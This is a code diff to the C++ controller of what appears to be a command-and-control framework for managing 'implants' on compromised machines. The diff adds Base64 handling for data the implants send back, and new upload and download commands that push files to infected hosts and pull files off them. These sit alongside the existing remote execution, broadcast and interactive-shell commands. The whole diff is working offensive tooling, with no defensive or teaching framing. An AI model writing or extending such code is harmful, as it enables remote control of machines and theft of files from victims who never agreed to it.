@@ -21,6 +21,7 @@
 #include <memory>
 #include <cstring>
 #include <filesystem>
+#include <fstream>
 
 // Linux networking
 #include <sys/socket.h>
@@ -92,7 +93,30 @@ static std::string ExtractJSONValue(const std::string& json, const std::string& 
     return json.substr(pos, endPos - pos);
 }
 
-static std::vector<uint8_t> Base64DecodeStatic(const std::string& data) {
+static std::string Base64EncodeStatic(const std::string& input) {
+    static const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string output;
+    output.reserve(((input.size() + 2) / 3) * 4);
+
+    for (size_t i = 0; i < input.size(); i += 3) {
+        unsigned char b0 = static_cast<unsigned char>(input[i]);
+        unsigned char b1 = (i + 1 < input.size()) ? static_cast<unsigned char>(input[i + 1]) : 0;
+        unsigned char b2 = (i + 2 < input.size()) ? static_cast<unsigned char>(input[i + 2]) : 0;
+
+        unsigned char c0 = static_cast<unsigned char>(b0 >> 2);
+        unsigned char c1 = static_cast<unsigned char>(((b0 & 0x03) << 4) | (b1 >> 4));
+        unsigned char c2 = static_cast<unsigned char>(((b1 & 0x0F) << 2) | (b2 >> 6));
+        unsigned char c3 = static_cast<unsigned char>(b2 & 0x3F);
+
+        output.push_back(alphabet[c0]);
+        output.push_back(alphabet[c1]);
+        output.push_back((i + 1 < input.size()) ? alphabet[c2] : '=');
+        output.push_back((i + 2 < input.size()) ? alphabet[c3] : '=');
+    }
+    return output;
+}
+
+static std::string Base64DecodeStatic(const std::string& data) {
     static const int decodeTable[256] = {
         -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
         -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
@@ -353,16 +377,40 @@ private:
         if (response.find("\"type\":\"result\"") != std::string::npos) {
             std::string result = ExtractJSONValue(response, "data");
             result = UnescapeJSON(result);
+            std::string decoded = Base64DecodeStatic(result);
             
-            // Handle file downloads
-            if (result.size() >= 5 && result.substr(0, 5) == "FILE:") {
-                SaveDownloadedFile(result, implant->hostname);
+            if (decoded.size() >= 5 && decoded.substr(0, 5) == "FILE:") {
+                SaveDownloadedFile(decoded, implant->hostname);
             } else {
-                implant->commandResults.push(result);
+                implant->commandResults.push(decoded.empty() ? result : decoded);
             }
         }
     }
     
+    bool SendFileUpload(std::shared_ptr<ImplantSession> implant, const std::string& localPath, const std::string& remotePath) {
+        std::ifstream input(localPath, std::ios::binary);
+        if (!input) {
+            std::cout << "[!] Unable to read local file: " << localPath << std::endl;
+            return false;
+        }
+        std::string contents((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
+        input.close();
+
+        std::string payload = "upload|" + remotePath + "|" + Base64EncodeStatic(contents);
+        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(payload) + "\"}";
+        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
+        totalBytesTransferred += sent;
+        return sent == (int)packet.size();
+    }
+
+    bool SendFileDownload(std::shared_ptr<ImplantSession> implant, const std::string& remotePath, const std::string& localPath) {
+        std::string payload = "download|" + remotePath + "|" + localPath;
+        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(payload) + "\"}";
+        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
+        totalBytesTransferred += sent;
+        return sent == (int)packet.size();
+    }
+
     void SaveDownloadedFile(const std::string& fileData, const std::string& hostname) {
         size_t pos1 = fileData.find(':', 5);
         size_t pos2 = fileData.find(':', pos1 + 1);
@@ -379,7 +427,7 @@ private:
         fs::create_directories(downloadDir);
         
         std::string savePath = downloadDir + "/" + fileName;
-        auto decoded = Base64DecodeStatic(b64Data);
+        std::string decoded = Base64DecodeStatic(b64Data);
         
         std::ofstream file(savePath, std::ios::binary);
         if (file) {
@@ -470,6 +518,22 @@ private:
                     ExecuteCommand(target, command);
                 }
             }
+            else if (cmd == "upload") {
+                if (tokens.size() >= 4) {
+                    std::string target = tokens[1];
+                    std::string localPath = tokens[2];
+                    std::string remotePath = tokens[3];
+                    UploadFile(target, localPath, remotePath);
+                }
+            }
+            else if (cmd == "download") {
+                if (tokens.size() >= 4) {
+                    std::string target = tokens[1];
+                    std::string remotePath = tokens[2];
+                    std::string localPath = tokens[3];
+                    DownloadFile(target, remotePath, localPath);
+                }
+            }
             else if (cmd == "broadcast") {
                 if (tokens.size() >= 2) {
                     std::string command = input.substr(input.find(tokens[1]));
@@ -492,13 +556,15 @@ private:
     void ShowHelp() {
         std::cout << R"(
 Commands:
-  list/implants        - List all connected implants
-  info <id>            - Show implant details
-  interact <id>        - Interactive shell with implant
-  exec <id> <command>  - Execute command on implant
-  broadcast <command>  - Execute on all implants
-  stats                - Show statistics
-  exit/quit            - Shutdown controller
+  list/implants                - List all connected implants
+  info <id>                    - Show implant details
+  interact <id>                - Interactive shell with implant
+  exec <id> <command>          - Execute command on implant
+  upload <id> <local> <remote> - Upload a file to the implant
+  download <id> <remote> <local> - Download a file from the implant
+  broadcast <command>          - Execute on all implants
+  stats                        - Show statistics
+  exit/quit                    - Shutdown controller
 )" << std::endl;
     }
     
@@ -596,6 +662,32 @@ Commands:
         std::cout << "\n[*] Returned to C2>\n";
     }
     
+    void UploadFile(const std::string& targetId, const std::string& localPath, const std::string& remotePath) {
+        std::lock_guard<std::mutex> lock(implantMutex);
+        for (auto& pair : implants) {
+            if (pair.first == targetId || pair.first.find(targetId) == 0) {
+                if (pair.second->isOnline && SendFileUpload(pair.second, localPath, remotePath)) {
+                    std::cout << "[+] Upload queued for " << pair.second->hostname << "\n";
+                }
+                return;
+            }
+        }
+        std::cout << "[!] Implant not found\n";
+    }
+
+    void DownloadFile(const std::string& targetId, const std::string& remotePath, const std::string& localPath) {
+        std::lock_guard<std::mutex> lock(implantMutex);
+        for (auto& pair : implants) {
+            if (pair.first == targetId || pair.first.find(targetId) == 0) {
+                if (pair.second->isOnline && SendFileDownload(pair.second, remotePath, localPath)) {
+                    std::cout << "[+] Download queued for " << pair.second->hostname << "\n";
+                }
+                return;
+            }
+        }
+        std::cout << "[!] Implant not found\n";
+    }
+
     void ExecuteCommand(const std::string& targetId, const std::string& command) {
         std::lock_guard<std::mutex> lock(implantMutex);
         
